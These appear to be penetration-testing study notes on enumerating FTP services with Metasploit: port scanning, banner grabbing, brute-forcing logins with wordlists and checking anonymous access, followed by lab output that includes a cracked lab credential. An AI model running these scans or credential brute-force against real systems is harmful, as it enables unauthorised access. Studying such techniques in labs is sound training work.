- File Transfer Protocol 
- Over port 21
- Shares files between a web server and client]
- Basic Authentication or Anonymously

## Commands

Port scan with metasploit
```
search portscan
/auxiliary/portscan/tcp
options 
set RHOSTS <target_ip_address>
exploit
```

Check version of ftp (grab the ftp banner)
```
search type:auxiliary name:ftp
/auxiliary/scanner/ftp/ftp_version
options
set RHOSTS <target_ip_address>
exploit
```

Enumerate ftp login
```
search type:auxiliary name:ftp
/auxiliary/scanner/ftp/ftp_login
set RHOSTS <target_ip_address>
options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common-usernames.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```

Check anonymous login to FTP
```
search type:auxiliary name:ftp
/auxiliary/scanner/ftp/anonymous
options 
set RHOSTS <target_ip_address>
exploit
```

Login to ftp server
```
ftp  <target_ip_address> 
```

## Quiz
What is the default FTP port?

	21 

## Lab

```
192.240.171.3
FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) 
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
sysadmin:654321
```



192.196.97.3
```
auxiliary(scanner/ftp/ftp_version)

[+] 192.196.97.3:21       - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.196.97.3]\x0d\x0a'
```
